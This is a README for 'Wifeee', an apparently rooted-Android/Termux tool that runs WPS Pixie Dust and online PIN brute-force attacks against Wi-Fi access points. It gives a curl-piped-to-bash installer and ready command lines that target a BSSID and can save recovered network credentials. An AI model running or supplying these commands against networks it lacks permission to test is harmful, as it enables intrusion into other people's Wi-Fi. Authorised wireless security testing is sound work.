# Wifeee

Wifeee performs the [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without requiring monitor mode.

## Features

- Pixie Dust attack
- Integrated 3WiFi offline WPS PIN generator
- Online WPS brute force
- Wi-Fi scanner with highlighting based on `iw`

## Requirements

- [Termux Latest](https://termux.com)
- Rooted phone
- Android 9+

## Setup

### Using Installer

```
curl -sSf https://raw.githubusercontent.com/5hojib/Wifeee/main/installer.sh | bash
```

### Running

```
sudo python Wifee/boom.py -i wlan0 -K
```

## Usage

```
Wifee/boom.py <arguments>

Required arguments:
  -i, --interface=<wlan0> : Name of the interface to use

Optional arguments:
  -b, --bssid=<mac>       : BSSID of the target AP
  -p, --pin=<wps pin>     : Use the specified pin (arbitrary string or 4/8 digit pin)
  -K, --pixie-dust        : Run Pixie Dust attack
  -B, --bruteforce        : Run online brute force attack
  --push-button-connect   : Run WPS push button connection

Advanced arguments:
  -d, --delay=<n>         : Set the delay between pin attempts [0]
  -w, --write             : Write AP credentials to file on success
  -F, --pixie-force       : Run Pixiewps with --force option (brute force full range)
  -X, --show-pixie-cmd    : Always print Pixiewps command
  --vuln-list=<filename>  : Use custom file with vulnerable devices list ['vulnwsc.txt']
  --iface-down            : Down network interface when work is finished
  -l, --loop              : Run in a loop
  -r, --reverse-scan      : Reverse order of networks in the list (useful on small displays)
  --mtk-wifi              : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                              (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in system settings before using this.
  -v, --verbose           : Verbose output
```

## Usage Examples

Start Pixie Dust attack on a specified BSSID:

```
sudo python3 Wifee/boom.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
```

Show available networks and start Pixie Dust attack on a specified network:

```
sudo python3 Wifee/boom.py -i wlan0 -K
```

Launch online WPS brute force with the specified first half of the PIN:

```
sudo python3 Wifee/boom.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
```

Start WPS push button connection:

```
sudo python3 Wifee/boom.py -i wlan0 --push-button-connect
```

## Troubleshooting

#### Device or resource busy (-16)

- Disable Wi-Fi in the system settings.

#### The `wlan0` interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC

- Run OneShot with the `--mtk-wifi` flag to initialize the Wi-Fi device driver.
